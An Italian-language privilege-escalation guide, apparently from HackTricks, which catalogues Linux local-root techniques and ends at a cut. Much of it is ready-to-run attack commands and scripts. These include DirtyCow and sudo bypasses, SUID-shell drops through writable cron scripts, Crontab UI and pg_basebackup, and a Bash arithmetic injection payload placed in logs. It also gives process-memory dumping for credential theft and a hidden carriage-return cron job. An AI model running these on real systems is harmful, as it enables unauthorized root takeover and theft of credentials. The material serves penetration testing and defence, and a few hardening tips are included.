# Escalation dei privilegi in Linux

{{#include ../../../banners/hacktricks-training.md}}

Per un contesto più ampio e per i workflow storici di enumerazione, confronta le risorse g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation e linux-private-i elencate nei riferimenti.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informazioni sul sistema

### Informazioni sul sistema operativo

Iniziamo acquisendo alcune informazioni sul sistema operativo in esecuzione
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Percorso

Se **hai permessi di scrittura su una qualsiasi cartella contenuta nella variabile `PATH`**, potresti essere in grado di dirottare alcune librerie o alcuni binari:
```bash
echo $PATH
```
### Informazioni sull'ambiente

Informazioni interessanti, password o API keys nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploit del kernel

Controlla la versione del kernel e verifica se esiste qualche exploit che può essere utilizzato per aumentare i privilegi
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare una buona lista di kernel vulnerabili e alcuni **compiled exploits** qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Altri siti dove puoi trovare alcuni **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni del kernel vulnerabili da quel sito puoi eseguire:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gli strumenti che possono aiutare a cercare kernel exploit sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (eseguilo sulla vittima; verifica solo gli exploit per il kernel 2.x)

Cerca sempre **la versione del kernel su Google**; forse la tua versione del kernel è indicata in qualche kernel exploit, così sarai sicuro che questo exploit sia valido.

Tecniche aggiuntive di kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Privilege Escalation su Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versione di Sudo

In base alle versioni vulnerabili di sudo riportate in:
```bash
searchsploit sudo
```
Puoi verificare se la versione di sudo è vulnerabile usando questo grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Le versioni di Sudo precedenti alla 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) consentono agli utenti locali non privilegiati di aumentare i propri privilegi a root tramite l'opzione `--chroot` di sudo quando il file `/etc/nsswitch.conf` viene utilizzato da una directory controllata dall'utente.<sup>[[28]](#references)[[29]](#references)</sup>

Ecco una [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) per sfruttare quella [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Prima di eseguire l'exploit, assicurati che la tua versione di `sudo` sia vulnerable e che supporti la funzionalità `chroot`.

Per ulteriori informazioni, consulta l'[advisory originale sulla vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Bypass delle regole sudo basate sull'host (CVE-2025-32462)

Sudo precedente alla 1.9.17p1 (intervallo interessato segnalato: **1.8.8–1.9.17**) può valutare le regole sudoers basate sull'host utilizzando l'**hostname fornito dall'utente** tramite `sudo -h <host>` invece dell'**hostname reale**. Se sudoers concede privilegi più ampi su un altro host, puoi eseguire lo **spoof** di tale host localmente.<sup>[[29]](#references)</sup>

Requisiti:
- Versione di sudo vulnerable
- Regole sudoers specifiche per l'host (l'host non è né l'hostname attuale né `ALL`)

Esempio di pattern sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit tramite spoofing dell'host consentito:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Se la risoluzione del nome contraffatto si blocca, aggiungilo a `/etc/hosts` oppure usa un hostname che compare già nei log/configs per evitare le ricerche DNS.

#### sudo < v1.8.28

Da @sickrov
```
sudo -u#-1 /bin/bash
```
### Verifica della firma di dmesg non riuscita

Controlla la **box smasher2 di HTB** per un **esempio** di come questa vuln potrebbe essere sfruttata
```bash
dmesg 2>/dev/null | grep "signature"
```
### Ulteriore enumerazione del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerare le possibili difese

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

If you are inside a container, start with the following sezione di container-security and then pivot into the pagine di abuso specifiche del runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

Controlla **cosa è montato e smontato**, dove e perché. Se qualcosa è smontato, potresti provare a montarlo e controllare la presenza di informazioni private
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software utili

Elenca i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Inoltre, verifica se **è installato qualche compilatore**. Questo è utile se devi usare un kernel exploit, poiché è consigliabile compilarlo sulla macchina in cui intendi utilizzarlo (o su una simile).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerabile installato

Controlla la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci una versione obsoleta di Nagios, ad esempio, che potrebbe essere sfruttata per aumentare i privilegi…\
È consigliato controllare manualmente la versione dei software installati più sospetti.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se hai accesso SSH alla macchina, potresti anche usare **openVAS** per verificare la presenza di software obsoleto e vulnerabile installato nella macchina.

> [!NOTE] > _Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili; pertanto, sono consigliate alcune applicazioni come OpenVAS o simili, che verificheranno se qualche versione del software installato è vulnerabile a exploit noti_

## Processi

Esamina **quali processi** sono in esecuzione e verifica se qualche processo dispone di **più privilegi del dovuto** (ad esempio, un tomcat eseguito da root?).
```bash
ps aux
ps -ef
top -n 1
```
Controlla sempre la presenza di eventuali [**debugger electron/cef/chromium**](../../software-information/electron-cef-chromium-debugger-abuse.md) in esecuzione: potresti sfruttarli per effettuare una privilege escalation. **Linpeas** li rileva controllando il parametro `--inspect` nella riga di comando del processo.\
Controlla inoltre i **tuoi privilegi sui binari dei processi**: potresti riuscire a sovrascrivere quelli di qualcun altro.

### Catene parent-child tra utenti diversi

Un processo figlio eseguito con un **utente diverso** da quello del processo padre non è automaticamente malevolo, ma costituisce un utile **segnale di triage**. Alcune transizioni sono previste (`root` che avvia un service user, i login manager che creano processi di sessione), ma catene insolite possono rivelare wrapper, helper di debug, persistence o confini di trust runtime deboli.

Revisione rapida:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Se trovi una catena sorprendente, esamina la command line del processo padre e tutti i file che ne influenzano il comportamento (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). In diversi percorsi reali di privesc, il processo figlio non era writable, ma lo erano la **config controllata dal processo padre** o la catena di helper.

### Eseguibili eliminati e file eliminati ancora aperti

Gli artefatti runtime sono spesso ancora accessibili **dopo l'eliminazione**. Questo è utile sia per la privilege escalation sia per recuperare prove da un processo che ha già aperto file sensibili.

Controlla gli eseguibili eliminati:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Se `/proc/<PID>/exe` punta a `(deleted)`, il processo sta ancora eseguendo dalla memoria la vecchia immagine binaria. Questo è un segnale forte da analizzare perché:

- l'eseguibile rimosso può contenere stringhe o credenziali interessanti
- il processo in esecuzione può ancora esporre descrittori di file utili
- un binario privilegiato eliminato può indicare una recente manomissione o un tentativo di ripulitura

Raccogli globalmente i file eliminati ma ancora aperti:
```bash
lsof +L1
```
Se trovi un descrittore interessante, recuperalo direttamente:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ciò è particolarmente utile quando un processo mantiene ancora aperto un secret, uno script, un database export o un flag file eliminato.

### Monitoraggio dei processi

Puoi utilizzare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Questo può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando viene soddisfatto un insieme di requisiti.

### Memoria dei processi

Alcuni servizi di un server salvano **credenziali in chiaro all'interno della memoria**.\
Normalmente avrai bisogno dei **privilegi root** per leggere la memoria dei processi appartenenti ad altri utenti; pertanto, questo è solitamente più utile quando sei già root e vuoi scoprire altre credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi che possiedi**.

> [!WARNING]
> Nota che al giorno d'oggi la maggior parte delle macchine **non consente ptrace per impostazione predefinita**, il che significa che non puoi effettuare il dump di altri processi appartenenti al tuo utente non privilegiato.
>
> Il file _**/proc/sys/kernel/yama/ptrace_scope**_ controlla l'accessibilità di ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tutti i processi possono essere sottoposti a debug, purché abbiano lo stesso uid. Questo è il funzionamento classico di ptrace.
> - **kernel.yama.ptrace_scope = 1**: solo un processo padre può essere sottoposto a debug.
> - **kernel.yama.ptrace_scope = 2**: solo un admin può utilizzare ptrace, poiché è richiesta la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario un reboot per abilitare nuovamente ptrace.

#### GDB

Se hai accesso alla memoria di un servizio FTP (ad esempio), potresti ottenere l'Heap e cercare al suo interno le credenziali.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Per un determinato ID di processo, **maps mostra come la memoria è mappata nello spazio degli indirizzi** virtuale di quel processo; mostra anche i **permessi di ogni regione mappata**. Il pseudo-file **mem espone la memoria stessa del processo**. Dal file **maps** sappiamo quali **regioni di memoria sono leggibili** e i relativi offset. Usiamo queste informazioni per **eseguire il seek nel file mem e fare il dump di tutte le regioni leggibili** in un file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornisce accesso alla memoria **fisica** del sistema, non alla memoria virtuale. Lo spazio degli indirizzi virtuali del kernel è accessibile usando /dev/kmem.\
In genere, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump per Linux

ProcDump è una reinterpretazione per Linux del classico strumento ProcDump della suite di strumenti Sysinternals per Windows. Scaricalo da [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Strumenti

Per eseguire il dump della memoria di un processo puoi usare:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root ed eseguire il dump del processo di tua proprietà
- Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root richiesto)

### Credenziali dalla memoria del processo

#### Esempio manuale

Se scopri che il processo di autenticazione è in esecuzione:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puoi eseguire il dump del processo (consulta le sezioni precedenti per trovare diversi modi di eseguire il dump della memoria di un processo) e cercare credenziali all'interno della memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ruba credenziali in chiaro dalla memoria** e da alcuni **file noti**. Per funzionare correttamente richiede privilegi di root.

| Funzionalità                                      | Nome del processo     |
| ------------------------------------------------- | ---------------------- |
| Password GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connessioni FTP attive)                   | vsftpd               |
| Apache2 (sessioni HTTP Basic Auth attive)         | apache2              |
| OpenSSH (sessioni SSH attive - utilizzo di Sudo)  | sshd:                |

#### Regex di ricerca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Job pianificati/Cron

### Crontab UI (alseambusher) in esecuzione come root – privesc tramite scheduler basato sul web

Se un pannello web “Crontab UI” (alseambusher/crontab-ui) viene eseguito come root ed è associato solo al loopback, puoi comunque raggiungerlo tramite port forwarding locale SSH e creare un job privilegiato per effettuare l'escalation.<sup>[[1]](#references)[[4]](#references)</sup>

Catena tipica
- Individua la porta accessibile solo dal loopback (ad es. 127.0.0.1:8000) e il realm Basic-Auth tramite `ss -ntlp` / `curl -v localhost:8000`
- Trova le credenziali negli artefatti operativi:
- Backup/script con `zip -P <password>`
- unit systemd che espone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crea un tunnel ed effettua il login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job con privilegi elevati ed eseguilo immediatamente (rilascia una shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Usalo:
```bash
/tmp/rootshell -p   # root shell
```
Rafforzamento
- Non eseguire Crontab UI come root; limita l'accesso con un utente dedicato e permessi minimi
- Effettua il binding su localhost e limita ulteriormente l'accesso tramite firewall/VPN; non riutilizzare le password
- Evita di incorporare i secrets nei file unit; usa secret stores o un EnvironmentFile accessibile solo a root
- Abilita l'audit/logging per le esecuzioni on-demand dei job

Verifica se qualche job schedulato è vulnerabile. Forse puoi sfruttare uno script eseguito da root (wildcard vuln? puoi modificare file utilizzati da root? usare symlinks? creare file specifici nella directory utilizzata da root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Se viene usato `run-parts`, verifica quali nomi verranno realmente eseguiti:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Questo evita i falsi positivi. Una directory periodica scrivibile è utile solo se il nome del tuo payload corrisponde alle regole locali di `run-parts`.

### Percorso di Cron

Ad esempio, all'interno di _/etc/crontab_ puoi trovare il PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota come l'utente "user" disponga dei privilegi di scrittura su /home/user_)

Se all'interno di questo crontab l'utente root tenta di eseguire un comando o uno script senza impostare il path. Ad esempio: _\* \* \* \* root overwrite.sh_\
Quindi puoi ottenere una shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron che usa uno script con un carattere jolly (Wildcard Injection)

Se uno script viene eseguito da root e contiene un “**\***” all'interno di un comando, potresti sfruttarlo per causare comportamenti imprevisti (come una privesc). Esempio:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se il wildcard è preceduto da un percorso come** _**/some/path/\***_ **, non è vulnerabile (nemmeno** _**./\***_ **lo è).**

Leggi la pagina seguente per ulteriori tecniche di sfruttamento dei wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Iniezione tramite espansione aritmetica di Bash nei parser dei log di cron

Bash esegue l'espansione dei parametri e la sostituzione dei comandi prima della valutazione aritmetica in ((...)), $((...)) e let. Se un cron/parser eseguito come root legge campi di log non attendibili e li inserisce in un contesto aritmetico, un attacker può iniettare una sostituzione di comando $(...) che verrà eseguita come root quando viene eseguito il cron.<sup>[[22]](#references)</sup>

- Perché funziona: in Bash, le espansioni avvengono in questo ordine: espansione di parametri/variabili, sostituzione dei comandi, espansione aritmetica, quindi word splitting ed espansione dei pathname. Pertanto, un valore come `$(/bin/bash -c 'id > /tmp/pwn')0` viene prima sostituito (eseguendo il comando), quindi il restante valore numerico `0` viene usato per l'aritmetica, consentendo allo script di continuare senza errori.

- Pattern tipicamente vulnerabile:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Sfruttamento: fai scrivere nel log analizzato del testo controllato dall'attacker, in modo che il campo dall'aspetto numerico contenga una sostituzione di comando e termini con una cifra. Assicurati che il tuo comando non stampi su stdout (oppure reindirizzalo), così l'espressione aritmetica rimane valida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Sovrascrittura e symlink degli script di cron

Se **puoi modificare uno script di cron eseguito da root**, puoi ottenere una shell molto facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se lo script eseguito da root utilizza una **directory a cui hai accesso completo**, potrebbe essere utile eliminare quella cartella e **creare una cartella symlink verso un'altra** che contenga uno script controllato da te.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Convalida dei symlink e gestione più sicura dei file

Quando si esaminano script/binari privilegiati che leggono o scrivono file tramite percorso, verificare come vengono gestiti i link:

- `stat()` segue un symlink e restituisce i metadati della destinazione.
- `lstat()` restituisce i metadati del link stesso.
- `readlink -f` e `namei -l` aiutano a risolvere la destinazione finale e a mostrare i permessi di ogni componente del percorso.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Per difensori/sviluppatori, i pattern più sicuri contro i symlink tricks includono:

- `O_EXCL` con `O_CREAT`: fallisce se il path esiste già (impedisce all'attacker di creare in anticipo link/file).
- `openat()`: opera in relazione a un file descriptor di una directory trusted.
- `mkstemp()`: crea file temporanei atomicamente con permessi sicuri.

### Binary cron custom-signed con payload scrivibili
I blue teams a volte "firmano" i binary gestiti da cron scaricando una sezione ELF custom e cercando con grep una stringa del vendor prima di eseguirli come root. Se quel binary è scrivibile dal gruppo (ad esempio, `/opt/AV/periodic-checks/monitor` di proprietà di `root:devs 770`) e puoi fare leak del materiale di firma, puoi forgiare la sezione e hijackare il cron task:<sup>[[2]](#references)</sup>

1. Usa `pspy` per catturare il verification flow. In Era, root eseguiva `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, seguito da `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, e poi eseguiva il file.
2. Ricrea il certificato previsto usando la key/config ottenuta dal leak (da `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Crea un replacement malevolo (ad esempio, inserisci una SUID bash o aggiungi la tua SSH key) e incorpora il certificato in `.text_sig` in modo che grep abbia esito positivo:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sovrascrivi il binary pianificato preservando gli execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Attendi la prossima esecuzione di cron; quando il naive signature check ha esito positivo, il tuo payload viene eseguito come root.

### Processi cron frequenti

Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Potresti sfruttarli per fare privilege escalation.

Ad esempio, per **monitorare ogni 0,1 s durante 1 minuto**, **ordinare in base ai comandi eseguiti meno frequentemente** ed eliminare i comandi che sono stati eseguiti più spesso, puoi usare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche usare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (monitorerà ed elencherà ogni processo avviato).

### Backup root che preservano i mode bits impostati dall'attacker (pg_basebackup)

Se un cron di proprietà di root esegue `pg_basebackup` (o qualsiasi copia ricorsiva) su una directory del database in cui puoi scrivere, puoi inserire un **SUID/SGID binary** che verrà ricopiato come **root:root** con gli stessi mode bits nell'output del backup.<sup>[[26]](#references)</sup>

Flusso tipico di discovery (come utente DB con pochi privilegi):
- Usa `pspy` per individuare un cron di root che esegue qualcosa come `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` ogni minuto.
- Conferma che il cluster sorgente (ad esempio `/var/lib/postgresql/14/main`) sia scrivibile da te e che la destinazione (`/opt/backups/current`) diventi di proprietà di root dopo l'esecuzione del job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Questo funziona perché `pg_basebackup` preserva i bit dei permessi dei file durante la copia del cluster; quando viene eseguito da root, i file di destinazione ereditano **la proprietà di root + SUID/SGID scelti dall'attaccante**. Qualsiasi routine privilegiata di backup/copia simile che mantenga i permessi e scriva in una posizione eseguibile è vulnerabile.

### Cron job invisibili

È possibile creare un cronjob **inserendo un ritorno a capo dopo un commento** (senza carattere di nuova riga), e il cron job funzionerà. Esempio (notare il carattere di ritorno a capo):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Per rilevare questo tipo di accesso furtivo, esamina i file cron con strumenti che rendono visibili i caratteri di controllo:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servizi

### File _.service_ scrivibili

Controlla se puoi scrivere su qualsiasi file `.service`; in tal caso, **potresti modificarlo** in modo che **esegua** la tua **backdoor quando** il servizio viene **avviato**, **riavviato** o **arrestato** (potrebbe essere necessario attendere il riavvio della macchina).\
Ad esempio, crea la tua backdoor all'interno del file .service con **`ExecStart=/tmp/script.sh`**

### Binaries dei servizi scrivibili

Tieni presente che, se disponi di **permessi di scrittura sui binaries eseguiti dai servizi**, puoi modificarli per inserire delle backdoor, che verranno quindi eseguite quando i servizi saranno rieseguiti.

### systemd PATH - Percorsi relativi

Puoi visualizzare il PATH utilizzato da **systemd** con:
```bash
systemctl show-environment
```
Se scopri di poter **scrivere** in una delle cartelle del percorso, potresti essere in grado di **escalare i privilegi**. Devi cercare **percorsi relativi utilizzati nei file di configurazione dei servizi**, come:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Quindi, crea un **eseguibile** con lo **stesso nome del binario del percorso relativo** all'interno della cartella del PATH di systemd in cui puoi scrivere e, quando al servizio viene richiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), verrà eseguita la tua **backdoor** (gli utenti non privilegiati di solito non possono avviare/arrestare i servizi, ma verifica se puoi usare `sudo -l`).

**Scopri di più sui servizi con `man systemd.service`.**

## **Timer**

I **Timer** sono file di unità systemd il cui nome termina con `**.timer**` e che controllano i file `**.service**` o gli eventi. I **Timer** possono essere usati come alternativa a cron, poiché supportano nativamente gli eventi basati sull'orario del calendario e gli eventi basati sul tempo monotono, e possono essere eseguiti in modo asincrono.

Puoi enumerare tutti i timer con:
```bash
systemctl list-timers --all
```
### Timer scrivibili

Se puoi modificare un timer, puoi fargli eseguire alcune unità di systemd.unit (come un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione puoi leggere cos'è l'Unit:

> L'unità da attivare quando questo timer scade. L'argomento è il nome di un'unità, il cui suffisso non è ".timer". Se non specificato, questo valore fa riferimento a un service con lo stesso nome dell'unità timer, ad eccezione del suffisso. (Vedi sopra.) È consigliabile che il nome dell'unità attivata e il nome dell'unità timer siano identici, ad eccezione del suffisso.

Pertanto, per abusare di questo permesso dovresti:

- Trovare una systemd unit (come un `.service`) che **esegue un binary scrivibile**
- Trovare una systemd unit che **esegue un percorso relativo** e sulla quale disponi di **permessi di scrittura** nel **PATH di systemd** (per impersonare quell'eseguibile)

**Scopri di più sui timer con `man systemd.timer`.**

### **Abilitazione del timer**

Per abilitare un timer sono necessari i privilegi di root ed eseguire:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota che il **timer** viene **attivato** creando un symlink verso di esso in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

